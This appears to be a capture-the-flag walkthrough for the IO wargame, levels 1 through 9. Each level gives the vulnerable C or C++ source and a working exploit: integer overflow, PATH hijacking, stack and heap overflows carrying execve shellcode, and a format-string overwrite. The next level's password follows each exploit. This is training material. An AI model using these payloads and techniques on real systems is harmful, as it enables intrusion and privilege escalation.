# [IO](http://io.netgarage.org/)

## level 1

```
$ ssh level1@io.netgarage.org
password: level1
```

```
$ objdump -j .text -Sl /levels/level01
8048080:804808068 28 91 04 08          push   $0x8049128
8048085:8048085e8 85 00 00 00          call   804810f <puts>
804808a:804808ae8 10 00 00 00          call   804809f <fscanf>
804808f:804808f3d 0f 01 00 00          cmp    $0x10f,%eax
8048094:80480940f 84 42 00 00 00       je     80480dc <YouWin>
804809a:804809ae8 64 00 00 00          call   8048103 <exit>
```

```
$ /levels/level01
Enter the 3 digit passcode to enter: 271
Congrats you found it, now read the password for level2 from /home/level2/.pass
```

```
$ cat /home/level2/.pass
XNWFtWKWHhaaXoKI
```

## level 2

### level 2

```
$ cat /levels/level02.c
```

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void catcher(int a)
{
    setresuid(geteuid(),geteuid(),geteuid());
    printf("WIN!\n");
    system("/bin/sh");
    exit(0);
}

int main(int argc, char **argv)
{
    puts("source code is available in level02.c\n");

    if (argc != 3 || !a#toi(argv[2]))
        return 1;
    signal(SIGFPE, catcher);
    return abs(atoi(argv[1])) / atoi(argv[2]);
}
```

```
$ /levels/level02 -2147483648 -1
WIN!
```

### level02 alt

```
$ cat /levels/level02.c
```

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define answer 3.141593

void main(int argc, char **argv) {

    float a = (argc - 2)?: strtod(argv[1], 0);

    printf("You provided the number %f which is too ", a);

    if(a < answer)
        puts("low");
    else if(a > answer)
        puts("high");
    else
        execl("/bin/sh", "sh", "-p", NULL);
}
```

```
$ /levels/level02_alt nan
```

```
$ cat /home/level3/.pass
OlhCmdZKbuzqngfz
```

## level 3

```
$ cat /levels/level03.c
```

```cpp
#include <stdio.h>
#include <string.h>

void good()
{
    puts("Win.");
    execl("/bin/sh", "sh", NULL);
}

void bad()
{
    printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
    void (*functionpointer)(void) = bad;
    char buffer[50];

    if(argc != 2 || strlen(argv[1]) < 4)
        return 0;

    memcpy(buffer, argv[1], strlen(argv[1]));
    memset(buffer, 0, strlen(argv[1]) - 4);

    printf("This is exciting we're going to %p\n", functionpointer);
    functionpointer();

    return 0;
}
```

```
$ /levels/level03 `echo -e "123451234512345123451234512345123451234512345123451234512345123451234512345=\x74"`
This is exciting we're going to 0x8048474
Win.
```

```
$ cat /home/level4/.pass
7WhHa5HWMNRAYl9T
```

## level 4

```
$ cat /levels/level04.c
```

```cpp
#include <stdlib.h>
#include <stdio.h>

int main() {
    char username[1024];
    FILE* f = popen("whoami","r");
    fgets(username, sizeof(username), f);
    printf("Welcome %s", username);

    return 0;
}
```

```
$ mkdir /tmp/ving_dir
$ echo cat /home/level5/.pass >> /tmp/ving_dir/whoami
$ chmod 777 /tmp/ving_dir/whoami

$ PATH="/tmp/ving_dir:$PATH"
```

```
$ /levels/level04
Welcome DNLM3Vu0mZfX0pDd
```

## level 5

```
$ cat /levels/level05.c
```

```cpp
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {

    char buf[128];

    if(argc < 2) return 1;

    strcpy(buf, argv[1]);

    printf("%s\n", buf);
    return 0;
}
```

```
$ /levels/level05 `python -c 'print "\x90"*88+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"+"\x90"*26+"\x70\xfd\xff\xbf"'`
```

```
$ cat /home/level6/.pass
fQ8W8YlSBJBWKV2R
```

## level 6

```
$ cat /levels/level06.c
```

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

enum{
LANG_ENGLISH,
LANG_FRANCAIS,
LANG_DEUTSCH,
};

int language = LANG_ENGLISH;

struct UserRecord{
    char name[40];
    char password[32];
    int id;
};

void greetuser(struct UserRecord user){
    char greeting[64];
    switch(language){
        case LANG_ENGLISH:
            strcpy(greeting, "Hi "); break;
        case LANG_FRANCAIS:
            strcpy(greeting, "Bienvenue "); break;
        case LANG_DEUTSCH:
            strcpy(greeting, "Willkommen "); break;
    }
    strcat(greeting, user.name);
    printf("%s\n", greeting);
}

int main(int argc, char **argv, char **env){
    if(argc != 3) {
        printf("USAGE: %s [name] [password]\n", argv[0]);
        return 1;
    }

    struct UserRecord user = {0};
    strncpy(user.name, argv[1], sizeof(user.name));
    strncpy(user.password, argv[2], sizeof(user.password));

    char *envlang = getenv("LANG");
    if(envlang)
        if(!memcmp(envlang, "fr", 2))
            language = LANG_FRANCAIS;
        else if(!memcmp(envlang, "de", 2))
            language = LANG_DEUTSCH;

    greetuser(user);
}
```

```
$ export LANG=fr
$ export shellcode=`python -c 'print "\x90"*80+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"'`
$ /levels/level06 `python -c 'print "ving"*16, "\x90"*26+"\x0c\xff\xff\xbf"'`
```

```
$ cat /home/level7/.pass
U3A6ZtaTub14VmwV
```

## level 7

```
$ cat /levels/level07.c
```

```cpp
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    int count = atoi(argv[1]);
    int buf[10];

    if(count >= 10)
        return 1;

    memcpy(buf, argv[2], count * sizeof(int));

    if(count == 0x574f4c46) {
        printf("WIN!\n");
        execl("/bin/sh", "sh", NULL);
    } else
        printf("Not today son\n");

    return 0;
}
```

We need to pass a number in that is less than ```10```, but is big enough to allow us to overflow ```buf``` so that we can modify the value of ```count```. The data that’s written to ```buf``` is only allowed to be ```count * sizeof(int)``` in size. 

What’s interesting about this is that ```sizeof(int)``` on a 32-bit machine is 4, which is effectively a ```SHL 2``` operation.

```
$ gdb /levels/level07
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048414 <+0>:     push   %ebp
   0x08048415 <+1>:     mov    %esp,%ebp
   0x08048417 <+3>:     sub    $0x68,%esp
   0x0804841a <+6>:     and    $0xfffffff0,%esp
   0x0804841d <+9>:     mov    $0x0,%eax
   0x08048422 <+14>:    sub    %eax,%esp
   0x08048424 <+16>:    mov    0xc(%ebp),%eax
   0x08048427 <+19>:    add    $0x4,%eax
   0x0804842a <+22>:    mov    (%eax),%eax
   0x0804842c <+24>:    mov    %eax,(%esp)
   0x0804842f <+27>:    call   0x8048354 <atoi@plt>
   0x08048434 <+32>:    mov    %eax,-0xc(%ebp)
   0x08048437 <+35>:    cmpl   $0x9,-0xc(%ebp)
   0x0804843b <+39>:    jle    0x8048446 <main+50>
   0x0804843d <+41>:    movl   $0x1,-0x4c(%ebp)
   0x08048444 <+48>:    jmp    0x80484ad <main+153>
   0x08048446 <+50>:    mov    -0xc(%ebp),%eax
   0x08048449 <+53>:    shl    $0x2,%eax                <-here
   0x0804844c <+56>:    mov    %eax,0x8(%esp)
   0x08048450 <+60>:    mov    0xc(%ebp),%eax
   0x08048453 <+63>:    add    $0x8,%eax
   0x08048456 <+66>:    mov    (%eax),%eax
   0x08048458 <+68>:    mov    %eax,0x4(%esp)
   0x0804845c <+72>:    lea    -0x48(%ebp),%eax
   0x0804845f <+75>:    mov    %eax,(%esp)
   0x08048462 <+78>:    call   0x8048334 <memcpy@plt>
   0x08048467 <+83>:    cmpl   $0x574f4c46,-0xc(%ebp)
   0x0804846e <+90>:    jne    0x804849a <main+134>
   0x08048470 <+92>:    movl   $0x8048584,(%esp)
   0x08048477 <+99>:    call   0x8048344 <printf@plt>
   0x0804847c <+104>:   movl   $0x0,0x8(%esp)
   0x08048484 <+112>:   movl   $0x804858a,0x4(%esp)
   0x0804848c <+120>:   movl   $0x804858d,(%esp)
   0x08048493 <+127>:   call   0x8048324 <execl@plt>
   0x08048498 <+132>:   jmp    0x80484a6 <main+146>
   0x0804849a <+134>:   movl   $0x8048595,(%esp)
   0x080484a1 <+141>:   call   0x8048344 <printf@plt>
   0x080484a6 <+146>:   movl   $0x0,-0x4c(%ebp)
   0x080484ad <+153>:   mov    -0x4c(%ebp),%eax
   0x080484b0 <+156>:   leave
   0x080484b1 <+157>:   ret
End of assembler dump.
```

If we use ```SHL``` with numbers of a small enough negative value, those values become positive.

```
$ /levels/level07 -2147483616 `python -c 'print "\x46\x4c\x4f\x57"*100'`
WIN!
```

```
$ cat /home/level8/.pass
VSIhoeMkikH6SGht
```

## level 8

```
$ cat /levels/level08.cpp
```

```cpp
#include <iostream>
#include <cstring>
#include <unistd.h>

class Number
{
    public:
        Number(int x) : number(x) {}
        void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
        virtual int operator+(Number &r) {return number + r.number;}
    private:
        char annotation[100];
        int number;
};


int main(int argc, char **argv)
{
    if(argc < 2) _exit(1);

    Number *x = new Number(5);
    Number *y = new Number(6);
    Number &five = *x, &six = *y;

    five.setAnnotation(argv[1]);

    return six + five;
}
```

```
$ /levels/level08 `python -c 'print "\x28\xa0\x04\x08"+"\x90"*78+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"+"\x0c\xa0\x04\x08"'`
```

```
$ cat /home/level9/.pass
ise9uHhjOhZd0K4G
```

## level 9

```
$ cat /levels/level09.c
```

```cpp
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
    int  pad = 0xbabe;
    char buf[1024];
    strncpy(buf, argv[1], sizeof(buf) - 1);

    printf(buf);

    return 0;
}
```

This is a format string vulnerability challenge.

```
$ export shellcode=`python -c 'print "\x90"*200+"\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"'`
```

```
$ nm /levels/level09 | grep DTOR
080494d4 d __DTOR_END__
080494d0 d __DTOR_LIST__
```

Find where ```shellcode``` is on the stack, and write the address over the top of the destruction function pointer.

```
$ /levels/level09 `python -c'print "\xd4\x94\x04\x08" + "\xd5\x94\x04\x08" + "\xd6\x94\x04\x08" + "\xd7\x94\x04\x08" + "%104u%4$n%390u%5$n%257u%6$n%192u%7$n"'`
```

```
$ cat /home/level10/.pass
UT3ROlnUqI0R2nJA
```
